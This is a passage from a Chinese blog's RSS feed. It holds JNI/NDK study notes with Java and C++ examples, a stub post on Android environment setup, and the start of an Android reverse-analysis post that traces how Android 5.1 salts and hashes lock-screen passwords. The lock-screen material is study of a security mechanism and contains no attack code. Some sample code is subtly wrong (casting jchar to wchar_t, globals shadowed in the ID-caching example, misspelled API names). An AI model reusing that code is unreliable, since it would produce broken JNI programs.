        tv <span style="color:#f92672">=</span> findViewById<span style="color:#f92672">(</span>R<span style="color:#f92672">.</span><span style="color:#a6e22e">id</span><span style="color:#f92672">.</span><span style="color:#a6e22e">tv</span><span style="color:#f92672">);</span>
        bt <span style="color:#f92672">=</span> findViewById<span style="color:#f92672">(</span>R<span style="color:#f92672">.</span><span style="color:#a6e22e">id</span><span style="color:#f92672">.</span><span style="color:#a6e22e">button</span><span style="color:#f92672">);</span>
        bt<span style="color:#f92672">.</span><span style="color:#a6e22e">setOnClickListener</span><span style="color:#f92672">(</span><span style="color:#66d9ef">new</span> View<span style="color:#f92672">.</span><span style="color:#a6e22e">OnClickListener</span><span style="color:#f92672">()</span> <span style="color:#f92672">{</span>
            <span style="color:#a6e22e">@Override</span>
            <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">onClick</span><span style="color:#f92672">(</span>View v<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
                text <span style="color:#f92672">=</span> et<span style="color:#f92672">.</span><span style="color:#a6e22e">getText</span><span style="color:#f92672">().</span><span style="color:#a6e22e">toString</span><span style="color:#f92672">().</span><span style="color:#a6e22e">trim</span><span style="color:#f92672">();</span>
                callCppFunction<span style="color:#f92672">();</span>
                tv<span style="color:#f92672">.</span><span style="color:#a6e22e">setText</span><span style="color:#f92672">(</span>text<span style="color:#f92672">);</span>
            <span style="color:#f92672">}</span>
        <span style="color:#f92672">});</span>

    <span style="color:#f92672">}</span>

    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">native</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">callCppFunction</span><span style="color:#f92672">();</span>
<span style="color:#f92672">}</span>
</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-C++" data-lang="C++"><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;jni.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;string&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span><span style="color:#75715e">&lt;iostream&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span><span style="color:#75715e">&lt;algorithm&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e"></span><span style="color:#66d9ef">using</span> <span style="color:#66d9ef">namespace</span> std;

<span style="color:#66d9ef">extern</span> <span style="color:#e6db74">&#34;C&#34;</span>
JNIEXPORT <span style="color:#66d9ef">void</span> JNICALL
Java_com_example_naivete_jnidemo_MainActivity_callCppFunction(JNIEnv <span style="color:#f92672">*</span>env, jobject instance) {

    <span style="color:#75715e">// TODO
</span><span style="color:#75715e"></span>    <span style="color:#75715e">//获取text
</span><span style="color:#75715e"></span>    jfieldID  fid_tx <span style="color:#f92672">=</span> env<span style="color:#f92672">-&gt;</span>GetFieldID(env<span style="color:#f92672">-&gt;</span>GetObjectClass(instance),<span style="color:#e6db74">&#34;text&#34;</span>,<span style="color:#e6db74">&#34;Ljava/lang/String;&#34;</span>);
    <span style="color:#75715e">//获取ext对象
</span><span style="color:#75715e"></span>    jstring j_tx <span style="color:#f92672">=</span> (jstring)env<span style="color:#f92672">-&gt;</span>GetObjectField(instance,fid_tx);
    <span style="color:#75715e">//第一种方式
</span><span style="color:#75715e"></span>    <span style="color:#75715e">//获得字符串指针：
</span><span style="color:#75715e"></span>    <span style="color:#66d9ef">const</span> jchar<span style="color:#f92672">*</span> jstr1 <span style="color:#f92672">=</span> env<span style="color:#f92672">-&gt;</span>GetStringChars(j_tx,NULL);
    <span style="color:#75715e">//z转换成宽字符
</span><span style="color:#75715e"></span>    wstring <span style="color:#a6e22e">wstr</span>((<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">wchar_t</span><span style="color:#f92672">*</span>)jstr1);
    <span style="color:#75715e">//释放指针
</span><span style="color:#75715e"></span>    env<span style="color:#f92672">-&gt;</span>ReleaseStringChars(j_tx,jstr1);
    <span style="color:#75715e">//第一种END
</span><span style="color:#75715e"></span>
    <span style="color:#75715e">//第二种
</span><span style="color:#75715e"></span>    <span style="color:#66d9ef">const</span> jchar <span style="color:#f92672">*</span> jstr2 <span style="color:#f92672">=</span> env<span style="color:#f92672">-&gt;</span>GetStringCritical(j_tx,NULL);
    wstring <span style="color:#a6e22e">wstr2</span>((<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">wchar_t</span><span style="color:#f92672">*</span>)jstr2);
    env<span style="color:#f92672">-&gt;</span>ReleaseStringCritical(j_tx,jstr2);
    <span style="color:#75715e">//END
</span><span style="color:#75715e"></span>
    <span style="color:#75715e">//第三种
</span><span style="color:#75715e"></span>    jsize len <span style="color:#f92672">=</span> env<span style="color:#f92672">-&gt;</span>GetStringLength(j_tx);  <span style="color:#75715e">//获取长度
</span><span style="color:#75715e"></span>    jchar <span style="color:#f92672">*</span> jstr3 <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> jchar[len<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>];
    jstr3[len]<span style="color:#f92672">=</span><span style="color:#e6db74">L</span><span style="color:#e6db74">&#39;\0&#39;</span>;
    <span style="color:#75715e">//复制
</span><span style="color:#75715e"></span>    env<span style="color:#f92672">-&gt;</span>GetStringRegion(j_tx,<span style="color:#ae81ff">0</span>,len,jstr3);
    wstring <span style="color:#a6e22e">wstr3</span>((<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">wchar_t</span><span style="color:#f92672">*</span>)jstr3);
    <span style="color:#66d9ef">delete</span>[] jstr3;
    <span style="color:#75715e">//End
</span><span style="color:#75715e"></span>
    <span style="color:#75715e">//倒序
</span><span style="color:#75715e"></span>    reverse(wstr.begin(),wstr.end());
    jstring j_new_str <span style="color:#f92672">=</span> env<span style="color:#f92672">-&gt;</span>NewString((<span style="color:#66d9ef">const</span> jchar<span style="color:#f92672">*</span>)wstr.c_str(),(jint)wstr.size());
    env<span style="color:#f92672">-&gt;</span>SetObjectField(instance,fid_tx,j_new_str);
}
</code></pre></div><p><img src="http://my-md-1253484710.coscd.myqcloud.com/android-note-2-2.png" alt=""></p>
<p>​</p>
<h4 id="25-cc中操作java中的数组">2.5 C/C++中操作Java中的数组</h4>
<p>​	在java中数组分为两种：</p>
<ul>
<li>
<p>基本类型数组</p>
</li>
<li>
<p>对象类型数组</p>
<p>一个能用于两种不同类型数组的函数是：GetArrayLength(jarray array)。</p>
</li>
</ul>
<h5 id="251-操作基本类型的数组">2.5.1 操作基本类型的数组</h5>
<ol>
<li>
<p>Get<!-- raw HTML omitted -->ArrayElements方法<br>
<code>Get&lt;Type&gt;ArrayElements(&lt;Type&gt;Array arr,jboolean* isCopide)</code></p>
<p>把Java中的基本类型的数组转换成C++中的数组 两种方式：</p>
<p>一是拷贝一份传回本地，另外一种是把指向Java数组的指针直接传回到本地代码中</p>
<p>处理完后，通过Release<!-- raw HTML omitted -->Arrayelements 来释放数组。</p>
</li>
<li>
<p>Release<!-- raw HTML omitted -->Arrayelement 方法<br>
<code>Release&lt;Type&gt;Arrayelement(Type&gt;Array arr,&lt;Type&gt;* array,jint mode)</code></p>
<p>这个函数可以选择如何处理Java和C++中的数组，是提交还是撤销····内存是否释放等等。</p>
<p>mode的取值：</p>
<ul>
<li>0：对Java的数组进行更新并且释放C/C++数组</li>
<li>JNI_COMMIT：更新但是不释放</li>
<li>JNI_ABOUT：不更新，释放。</li>
</ul>
</li>
<li>
<p>GetPrimittiveArrayCritical方法<br>
<code>GetPrimittiveArrayCritical(jarray arr,jboolean* isCopied)</code></p>
</li>
<li>
<p>ReleasePrimittiveArrayCritical方法<br>
<code>ReleasePrimittiveArrayCritical(jarray arr,void* array,jint mode)</code></p>
</li>
<li>
<p>Get<!-- raw HTML omitted -->ArrayRegion方法<br>
<code>Get&lt;type&gt;ArrayRegion(&lt;Type&gt;Arryay arr,jsize strat ,jsize len,&lt;Type&gt;* buffer)</code></p>
<p>在C++中开辟内存，拷贝数组到内存中。</p>
</li>
<li>
<p>Set<!-- raw HTML omitted -->ArrayRegion<br>
<code>Set&lt;type&gt;ArrayRegion(&lt;Type&gt;Arryay arr,jsize strat ,jsize len,const &lt;Type&gt;* buffer)</code></p>
<p>把Java基本类型数组中的指定范围的元素用C++数组中的元素来赋值。</p>
</li>
<li>
<p><!-- raw HTML omitted -->ArrayNew方法<br>
<code>&lt;Type&gt;ArrayNew&lt;Type&gt;Array(jszie sz)</code></p>
<p>指定一个长度然后返回相应的Java基本类型的数组。</p>
</li>
</ol>
<h5 id="252-操作对象数组类型">2.5.2 操作对象数组类型</h5>
<p>​	JNI未提供把Java对象数组 直接转到C++对象数组的函数。而是通过<code>Get/SetObjectArrayaElement</code>这样的函数来对java中的对象数组进行操作。因为未拷贝 所以没有释放操作。<code>NewObjectArray</code>可以通过指定长度和初始值来创建某一个类的数组。</p>
<p>例子：两种类型的操作：</p>
<p>略·····</p>
<p>​	注：书本P34-36</p>
<h4 id="26-cc中的引用类型和id缓存">2.6 C++/C中的引用类型和ID缓存</h4>
<h5 id="261-引用类型">2.6.1 引用类型</h5>
<p>​	从Java创建对象传到本地C/C++代码时会产生引用，根据Java的垃圾回收机制，只要存在引用就不会触发改引用所指的Java对象垃圾回收。</p>
<p>​	几种C/C++中的引用类型：</p>
<ol>
<li>
<p>局部引用：（最常见）</p>
<p>局部引用只在该native函数中有用，所有在该函数中产生的局部引用，都会在函数返回时自动释放，也可以使用DeleteLocalRef函数手动释放。</p>
<p>有效期中能传递到别的本地函数中，千万不要用C++全局变量保存它，或者把它定义为C++静态局部变量。</p>
</li>
<li>
<p>全局引用：</p>
<p>可以跨越当前线程，在对个native函数中有效，需要手动释放。会阻止垃圾回收器回收这个引用所指的对象。</p>
<p>不同于局部引用，全局引用的创建不是由JNI自动创建的，全局引用是需要调用NewGlobalRef函数，释放使用ReleaseGlobalRef函数。</p>
</li>
<li>
<p>弱全局引用</p>
<p>与全局引用相似。不一样的为不会阻止垃圾回收器回收这个引用所指对象，使用NewWeakGlobalRef和ReleaseWeakGlobalRef来产生和释放。</p>
<p>关于引用的一些函数：</p>
<p><code>jobject NewGlobalRef(jobject obj)</code></p>
<p><code>jobject NewLocalRef(jobject obj)</code></p>
<p><code>jobject New WeakGlobalRef(jobject obj)</code></p>
<p><code>void DeleteGlobalRef(jobject obj)</code></p>
<p><code>void DeleteLocalRef(jobject obj)</code></p>
<p><code>void DeleteWeakGlobalRef(jobject obj)</code></p>
<p>很容易理解上面6个函数</p>
<p><code>jboolean IsSameObject(jobject obj1,jobject obj2)</code></p>
<p>这个函数用来比较两个引用是否相等，但是对于弱引用有一个特别的功能，如果把NULL传入要比较的对象中就能判断弱全局引用所指的Java对象是否被回收。</p>
<p>缓存jfieldID/jmethodID.减小查询开销。</p>
</li>
</ol>
<h5 id="262-缓存方法">2.6.2 缓存方法</h5>
<ol>
<li>
<p>在用的时候缓存</p>
<p>在native代码中使用static局部变量来保存已经查询过的id,就缓存下了id。</p>
</li>
<li>
<p>在Java类初始化时缓存</p>
<p>比较好的方法，在native调用前把所有ID全部保存下来。可以让Java代码在第一次加载这个类的时候首先调用本地代码初始化所有的jfildID/jmethodID.这样可以省去多次确定ID是否存在的语句。这些jfildID/jmethodID定义在C++的全局。当java类卸载或者重新加载的时候，也会重新计算ID.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java"><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">TestNative</span><span style="color:#f92672">{</span>
    <span style="color:#66d9ef">static</span><span style="color:#f92672">{</span>
        initNativeIDs<span style="color:#f92672">();</span>  <span style="color:#75715e">//静态代码块进行初始化
</span><span style="color:#75715e"></span>    <span style="color:#f92672">}</span>
    <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">native</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">initNativeIDs</span><span style="color:#f92672">();</span>
    <span style="color:#66d9ef">int</span> propInt <span style="color:#f92672">=</span> 0<span style="color:#f92672">;</span>
    String propStr <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">;</span>
    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">native</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">otherNative</span><span style="color:#f92672">();</span>
    <span style="color:#960050;background-color:#1e0010">···········</span>
<span style="color:#f92672">}</span>
</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-C++" data-lang="C++"><span style="color:#75715e">//全局变量
</span><span style="color:#75715e"></span>jfieldID g_propInt_id <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
jfieldID g_propStr_id <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
   
JNIEXPORT <span style="color:#66d9ef">void</span> JNICALL Java_<span style="color:#960050;background-color:#1e0010">····</span>init<span style="color:#960050;background-color:#1e0010">（</span>JNIEnv<span style="color:#f92672">*</span> env,jobject clazz<span style="color:#960050;background-color:#1e0010">）</span>{
    jfieldID g_propInt_id <span style="color:#f92672">=</span> GetfieldID(clazz,<span style="color:#e6db74">&#34;propInt&#34;</span>,<span style="color:#e6db74">&#34;I&#34;</span>);
    jfieldID g_propStr_id <span style="color:#f92672">=</span> GetfieldID(clazz,<span style="color:#e6db74">&#34;propStr&#34;</span>,<span style="color:#e6db74">&#34;/Ljava/lang/String;&#34;</span>);
}
JNIEXPORT <span style="color:#66d9ef">void</span> JNICALL Java_<span style="color:#960050;background-color:#1e0010">····</span>other<span style="color:#960050;background-color:#1e0010">（</span>JNIEnv<span style="color:#f92672">*</span> env,jobject clazz<span style="color:#960050;background-color:#1e0010">）</span>{
    <span style="color:#960050;background-color:#1e0010">············</span>
}
   
</code></pre></div></li>
</ol>
<h3 id="总结">总结</h3>
<p>​	主要是NDK开发相关。</p>
<p>​	感觉系统的学了一遍还是感觉不错的。</p>
<p>​	可以多找网上的例子来练习练习，加深对JNI 的了解。</p>
<p>​</p>
]]></content>
        </item>
        
        <item>
            <title>Android安全和开发环境搭建</title>
            <link>https://kuekiko.top/posts/2018/07/android%E5%AE%89%E5%85%A8%E5%92%8C%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</link>
            <pubDate>Thu, 05 Jul 2018 17:35:46 +0800</pubDate>
            
            <guid>https://kuekiko.top/posts/2018/07/android%E5%AE%89%E5%85%A8%E5%92%8C%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</guid>
            <description>Android安全和开发环境搭建  补充中·····
 JAVA环境  JDK下载与安装。 环境变量配置  Android Studio  官网下载（扶墙） SDK  NDK（JNI）开发  NDK下载 使用  Eclipse (还是推荐上面的AS) 不喜欢界面，弃用。
 </description>
            <content type="html"><![CDATA[<h1 id="android安全和开发环境搭建">Android安全和开发环境搭建</h1>
<blockquote>
<p>补充中·····</p>
</blockquote>
<h4 id="java环境">JAVA环境</h4>
<ol>
<li>JDK下载与安装。</li>
<li>环境变量配置</li>
</ol>
<h4 id="android-studio">Android Studio</h4>
<ol>
<li>官网下载（扶墙）</li>
<li>SDK</li>
</ol>
<h4 id="ndkjni开发">NDK（JNI）开发</h4>
<ol>
<li>NDK下载</li>
<li>使用</li>
</ol>
<h4 id="eclipse-还是推荐上面的as">Eclipse (还是推荐上面的AS)</h4>
<p>不喜欢界面，弃用。</p>
<h4 id="heading"></h4>
]]></content>
        </item>
        
        <item>
            <title>Android应用安全防护和逆向分析 基础篇①</title>
            <link>https://kuekiko.top/posts/2018/07/android%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8%E9%98%B2%E6%8A%A4%E5%92%8C%E9%80%86%E5%90%91%E5%88%86%E6%9E%90-%E5%9F%BA%E7%A1%80%E7%AF%87/</link>
            <pubDate>Mon, 02 Jul 2018 17:33:05 +0800</pubDate>
            
            <guid>https://kuekiko.top/posts/2018/07/android%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8%E9%98%B2%E6%8A%A4%E5%92%8C%E9%80%86%E5%90%91%E5%88%86%E6%9E%90-%E5%9F%BA%E7%A1%80%E7%AF%87/</guid>
            <description>第一章 Android中锁屏密码加密算法分析 1. 锁屏密码方式：  手势 九宫格连线 输入密码 指纹、人脸、虹膜 可穿戴设备  2. 这儿分析手势密码和输入密码 找到android源代码中的LockPatternUtils,java 这个工具类
路径：Android-5.1.1\frameworks\base\core\java\com\android\internal\widget
 2.1 输入密码算法分析 (5.1版本的源代码 和书上细微差异)
 public byte[] passwordToHash(String password, int userId) {//参数为密码和对应用户ID 默认0 if (password == null) {return null;}try {byte[] saltedPassword = (password + getSalt(userId)).getBytes(); byte[] sha1 = MessageDigest.getInstance(&amp;#34;SHA-1&amp;#34;).digest(saltedPassword);byte[] md5 = MessageDigest.getInstance(&amp;#34;MD5&amp;#34;).digest(saltedPassword);//首先让 password+salt值 再SHA-1和MD5 byte[] combined = new byte[sha1.length + md5.length];System.arraycopy(sha1, 0, combined, 0, sha1.</description>
            <content type="html"><![CDATA[<h2 id="第一章-android中锁屏密码加密算法分析">第一章 Android中锁屏密码加密算法分析</h2>
<h4 id="1-锁屏密码方式">1. 锁屏密码方式：</h4>
<ul>
<li>手势</li>
<li>九宫格连线</li>
<li>输入密码</li>
<li>指纹、人脸、虹膜</li>
<li>可穿戴设备</li>
</ul>
<h4 id="2-这儿分析手势密码和输入密码">2. 这儿分析手势密码和输入密码</h4>
<p>找到android源代码中的LockPatternUtils,java 这个工具类<br>
路径：Android-5.1.1\frameworks\base\core\java\com\android\internal\widget</p>
<blockquote>
<p>2.1 输入密码算法分析    (5.1版本的源代码 和书上细微差异)</p>
</blockquote>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java"><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">byte</span><span style="color:#f92672">[]</span> <span style="color:#a6e22e">passwordToHash</span><span style="color:#f92672">(</span>String password<span style="color:#f92672">,</span> <span style="color:#66d9ef">int</span> userId<span style="color:#f92672">)</span> <span style="color:#f92672">{</span><span style="color:#75715e">//参数为密码和对应用户ID 默认0
</span><span style="color:#75715e"></span>        <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>password <span style="color:#f92672">==</span> <span style="color:#66d9ef">null</span><span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
            <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">null</span><span style="color:#f92672">;</span>
        <span style="color:#f92672">}</span>

        <span style="color:#66d9ef">try</span> <span style="color:#f92672">{</span>
            <span style="color:#66d9ef">byte</span><span style="color:#f92672">[]</span> saltedPassword <span style="color:#f92672">=</span> <span style="color:#f92672">(</span>password <span style="color:#f92672">+</span> getSalt<span style="color:#f92672">(</span>userId<span style="color:#f92672">)).</span><span style="color:#a6e22e">getBytes</span><span style="color:#f92672">();</span>  
            <span style="color:#66d9ef">byte</span><span style="color:#f92672">[]</span> sha1 <span style="color:#f92672">=</span> MessageDigest<span style="color:#f92672">.</span><span style="color:#a6e22e">getInstance</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;SHA-1&#34;</span><span style="color:#f92672">).</span><span style="color:#a6e22e">digest</span><span style="color:#f92672">(</span>saltedPassword<span style="color:#f92672">);</span>
            <span style="color:#66d9ef">byte</span><span style="color:#f92672">[]</span> md5 <span style="color:#f92672">=</span> MessageDigest<span style="color:#f92672">.</span><span style="color:#a6e22e">getInstance</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;MD5&#34;</span><span style="color:#f92672">).</span><span style="color:#a6e22e">digest</span><span style="color:#f92672">(</span>saltedPassword<span style="color:#f92672">);</span>
<span style="color:#75715e">//首先让 password+salt值 再SHA-1和MD5
</span><span style="color:#75715e"></span>            <span style="color:#66d9ef">byte</span><span style="color:#f92672">[]</span> combined <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#66d9ef">byte</span><span style="color:#f92672">[</span>sha1<span style="color:#f92672">.</span><span style="color:#a6e22e">length</span> <span style="color:#f92672">+</span> md5<span style="color:#f92672">.</span><span style="color:#a6e22e">length</span><span style="color:#f92672">];</span>
            System<span style="color:#f92672">.</span><span style="color:#a6e22e">arraycopy</span><span style="color:#f92672">(</span>sha1<span style="color:#f92672">,</span> 0<span style="color:#f92672">,</span> combined<span style="color:#f92672">,</span> 0<span style="color:#f92672">,</span> sha1<span style="color:#f92672">.</span><span style="color:#a6e22e">length</span><span style="color:#f92672">);</span>
            System<span style="color:#f92672">.</span><span style="color:#a6e22e">arraycopy</span><span style="color:#f92672">(</span>md5<span style="color:#f92672">,</span> 0<span style="color:#f92672">,</span> combined<span style="color:#f92672">,</span> sha1<span style="color:#f92672">.</span><span style="color:#a6e22e">length</span><span style="color:#f92672">,</span> md5<span style="color:#f92672">.</span><span style="color:#a6e22e">length</span><span style="color:#f92672">);</span>
<span style="color:#75715e">//装换成hex值 再拼接起来
</span><span style="color:#75715e"></span>            <span style="color:#66d9ef">final</span> <span style="color:#66d9ef">char</span><span style="color:#f92672">[]</span> hexEncoded <span style="color:#f92672">=</span> HexEncoding<span style="color:#f92672">.</span><span style="color:#a6e22e">encode</span><span style="color:#f92672">(</span>combined<span style="color:#f92672">);</span>
            <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">new</span> String<span style="color:#f92672">(</span>hexEncoded<span style="color:#f92672">).</span><span style="color:#a6e22e">getBytes</span><span style="color:#f92672">(</span>StandardCharsets<span style="color:#f92672">.</span><span style="color:#a6e22e">UTF_8</span><span style="color:#f92672">);</span>
        <span style="color:#f92672">}</span> <span style="color:#66d9ef">catch</span> <span style="color:#f92672">(</span>NoSuchAlgorithmException e<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
            <span style="color:#66d9ef">throw</span> <span style="color:#66d9ef">new</span> AssertionError<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;Missing digest algorithm: &#34;</span><span style="color:#f92672">,</span> e<span style="color:#f92672">);</span>
        <span style="color:#f92672">}</span>
    <span style="color:#f92672">}</span>
</code></pre></div><p>如何获取设备对应的salt值：</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java">    <span style="color:#66d9ef">private</span> String <span style="color:#a6e22e">getSalt</span><span style="color:#f92672">(</span><span style="color:#66d9ef">int</span> userId<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
        <span style="color:#66d9ef">long</span> salt <span style="color:#f92672">=</span> getLong<span style="color:#f92672">(</span>LOCK_PASSWORD_SALT_KEY<span style="color:#f92672">,</span> 0<span style="color:#f92672">,</span> userId<span style="color:#f92672">);</span>
        <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>salt <span style="color:#f92672">==</span> 0<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>   <span style="color:#75715e">//值为0  重新生成
</span><span style="color:#75715e"></span>            <span style="color:#66d9ef">try</span> <span style="color:#f92672">{</span>
                salt <span style="color:#f92672">=</span> SecureRandom<span style="color:#f92672">.</span><span style="color:#a6e22e">getInstance</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;SHA1PRNG&#34;</span><span style="color:#f92672">).</span><span style="color:#a6e22e">nextLong</span><span style="color:#f92672">();</span>
                setLong<span style="color:#f92672">(</span>LOCK_PASSWORD_SALT_KEY<span style="color:#f92672">,</span> salt<span style="color:#f92672">,</span> userId<span style="color:#f92672">);</span>  <span style="color:#75715e">//保存值
</span><span style="color:#75715e"></span>                Log<span style="color:#f92672">.</span><span style="color:#a6e22e">v</span><span style="color:#f92672">(</span>TAG<span style="color:#f92672">,</span> <span style="color:#e6db74">&#34;Initialized lock password salt for user: &#34;</span> <span style="color:#f92672">+</span> userId<span style="color:#f92672">);</span>
            <span style="color:#f92672">}</span> <span style="color:#66d9ef">catch</span> <span style="color:#f92672">(</span>NoSuchAlgorithmException e<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
                <span style="color:#66d9ef">throw</span> <span style="color:#66d9ef">new</span> IllegalStateException<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;Couldn&#39;t get SecureRandom number&#34;</span><span style="color:#f92672">,</span> e<span style="color:#f92672">);</span>
            <span style="color:#f92672">}</span>
        <span style="color:#f92672">}</span>
        <span style="color:#66d9ef">return</span> Long<span style="color:#f92672">.</span><span style="color:#a6e22e">toHexString</span><span style="color:#f92672">(</span>salt<span style="color:#f92672">);</span>       <span style="color:#75715e">//  hex之后返回
</span><span style="color:#75715e"></span>    <span style="color:#f92672">}</span>
</code></pre></div><p>继续跟踪 看保存的地方</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java"><span style="color:#66d9ef">private</span> <span style="color:#66d9ef">long</span> <span style="color:#a6e22e">getLong</span><span style="color:#f92672">(</span>String secureSettingKey<span style="color:#f92672">,</span> <span style="color:#66d9ef">long</span> defaultValue<span style="color:#f92672">,</span> <span style="color:#66d9ef">int</span> userHandle<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
        <span style="color:#66d9ef">try</span> <span style="color:#f92672">{</span>
            <span style="color:#66d9ef">return</span> getLockSettings<span style="color:#f92672">().</span><span style="color:#a6e22e">getLong</span><span style="color:#f92672">(</span>secureSettingKey<span style="color:#f92672">,</span> defaultValue<span style="color:#f92672">,</span> userHandle<span style="color:#f92672">);</span>
        <span style="color:#f92672">}</span> <span style="color:#66d9ef">catch</span> <span style="color:#f92672">(</span>RemoteException re<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
            <span style="color:#66d9ef">return</span> defaultValue<span style="color:#f92672">;</span>
        <span style="color:#f92672">}</span>
    <span style="color:#f92672">}</span>
</code></pre></div><p>继续跟踪代码</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java"><span style="color:#a6e22e">@VisibleForTesting</span>
    <span style="color:#66d9ef">public</span> ILockSettings <span style="color:#a6e22e">getLockSettings</span><span style="color:#f92672">()</span> <span style="color:#f92672">{</span>
        <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>mLockSettingsService <span style="color:#f92672">==</span> <span style="color:#66d9ef">null</span><span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
            ILockSettings service <span style="color:#f92672">=</span> ILockSettings<span style="color:#f92672">.</span><span style="color:#a6e22e">Stub</span><span style="color:#f92672">.</span><span style="color:#a6e22e">asInterface</span><span style="color:#f92672">(</span>
                    ServiceManager<span style="color:#f92672">.</span><span style="color:#a6e22e">getService</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;lock_settings&#34;</span><span style="color:#f92672">));</span>   <span style="color:#75715e">//获取服务来操作
</span><span style="color:#75715e"></span>            mLockSettingsService <span style="color:#f92672">=</span> service<span style="color:#f92672">;</span>
        <span style="color:#f92672">}</span>
        <span style="color:#66d9ef">return</span> mLockSettingsService<span style="color:#f92672">;</span>
    <span style="color:#f92672">}</span>
</code></pre></div><p>在android中 这种获取服务的方式最终实现逻辑都是在XXXService类中</p>
<p>这里在LockSettingService.java中  找到这个类的getLong方法</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java"><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">long</span> <span style="color:#a6e22e">getLong</span><span style="color:#f92672">(</span>String key<span style="color:#f92672">,</span> <span style="color:#66d9ef">long</span> defaultValue<span style="color:#f92672">,</span> <span style="color:#66d9ef">int</span> userId<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
        checkReadPermission<span style="color:#f92672">(</span>key<span style="color:#f92672">,</span> userId<span style="color:#f92672">);</span>
        String value <span style="color:#f92672">=</span> getStringUnchecked<span style="color:#f92672">(</span>key<span style="color:#f92672">,</span> <span style="color:#66d9ef">null</span><span style="color:#f92672">,</span> userId<span style="color:#f92672">);</span>
        <span style="color:#66d9ef">return</span> TextUtils<span style="color:#f92672">.</span><span style="color:#a6e22e">isEmpty</span><span style="color:#f92672">(</span>value<span style="color:#f92672">)</span> <span style="color:#f92672">?</span> defaultValue <span style="color:#f92672">:</span> Long<span style="color:#f92672">.</span><span style="color:#a6e22e">parseLong</span><span style="color:#f92672">(</span>value<span style="color:#f92672">);</span>
    <span style="color:#f92672">}</span>
</code></pre></div><p>保存在数据库？</p>
<p>继续跟踪</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java"><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Injector</span> <span style="color:#f92672">{</span>

        <span style="color:#66d9ef">protected</span> Context mContext<span style="color:#f92672">;</span>

        <span style="color:#66d9ef">public</span> <span style="color:#a6e22e">Injector</span><span style="color:#f92672">(</span>Context context<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
            mContext <span style="color:#f92672">=</span> context<span style="color:#f92672">;</span>
        <span style="color:#f92672">}</span>

        <span style="color:#66d9ef">public</span> Context <span style="color:#a6e22e">getContext</span><span style="color:#f92672">()</span> <span style="color:#f92672">{</span>
            <span style="color:#66d9ef">return</span> mContext<span style="color:#f92672">;</span>
        <span style="color:#f92672">}</span>

